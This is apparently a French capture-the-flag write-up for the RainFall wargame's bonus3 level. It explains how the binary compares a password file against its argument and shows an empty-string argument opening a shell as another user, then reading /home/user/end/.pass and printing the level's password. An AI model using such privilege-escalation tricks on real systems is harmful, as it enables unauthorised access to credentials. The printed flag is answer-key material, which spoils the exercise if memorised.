## Démarches

-  En désassemblant le programme et avec gdb, on peut comprendre son fonctionnement :
   -  Il ouvre  "/home/user/end/.pass" avec `fopen`
   -  remplit les 33 premiers caractères d'une string avec `\0`
   -  Si le fichier existe et que le programme a pris un argument :
      - il lit, copie le fichier dans le buffer et le ferme 
      - il termine le buffer avec `\0` à l'index correspondant à la longueur de `av[1]` calculée avec `atoi`
      - il compare le buffer avec l'argument `av[1]` en utilisant `strcmp`      - si le résultat du `strcmp` est *0*, il exécute un shell 
   - Sinon :
     - il retourne `-1`

- Simplement en passant une chaine vide en paramètre, on peut passer la strcmp et ouvrir un shell :
  ```
  bonus3@RainFall:~$ ./bonus3  ""
    $ pwd
    /home/user/bonus3
    $ whoami
    end
    $ cat /home/user/end/.pass
    3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
    $ exit
    ```
<br>
----
## Ressources